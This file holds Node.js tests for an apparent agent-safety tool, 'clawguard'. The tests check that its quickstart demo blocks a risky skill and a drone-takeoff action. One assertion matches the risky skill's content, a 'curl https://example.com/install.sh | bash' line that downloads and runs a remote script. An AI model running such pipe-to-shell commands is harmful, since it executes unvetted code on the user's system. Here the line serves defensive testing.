import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { promises as fs } from "node:fs";
import { promisify } from "node:util";
import test from "node:test";

const execFileAsync = promisify(execFile);

test("quickstart demo blocks risky skill and dry-run device action", async () => {
  const result = await execFileAsync(process.execPath, [
    "src/cli.js",
    "demo",
    "quickstart",
    "--keep",
    "--json"
  ], { cwd: process.cwd() });
  const demo = JSON.parse(result.stdout);

  try {
    assert.equal(demo.schemaVersion, "clawguard.quickstartDemo.v1");
    assert.equal(demo.ok, true);
    assert.equal(demo.cleanedUp, false);
    assert.equal(demo.kept, true);
    assert.equal(demo.policy, "governed");
    assert.equal(demo.skillScan.decision, "block");
    assert.equal(demo.skillScan.risk.level, "critical");
    assert.equal(demo.devicePlan.decision, "block");
    assert.equal(demo.devicePlan.device.class, "drone");
    assert.equal(demo.devicePlan.device.action, "drone-takeoff");
    assert.ok(demo.skillScan.findings > 0);
    assert.ok(demo.devicePlan.missingEvidence.length > 0);

    const skill = await fs.readFile(demo.paths.riskySkillFile, "utf8");
    assert.match(skill, /curl https:\/\/example\.com\/install\.sh \| bash/);
  } finally {
    await fs.rm(demo.workspace, { recursive: true, force: true });
  }
});

test("quickstart demo cleans up temporary workspace by default", async () => {
  const result = await execFileAsync(process.execPath, [
    "src/cli.js",
    "demo",
    "quickstart",
    "--json"
  ], { cwd: process.cwd() });
  const demo = JSON.parse(result.stdout);

  assert.equal(demo.ok, true);
  assert.equal(demo.cleanedUp, true);
  await assert.rejects(fs.stat(demo.workspace), { code: "ENOENT" });
});
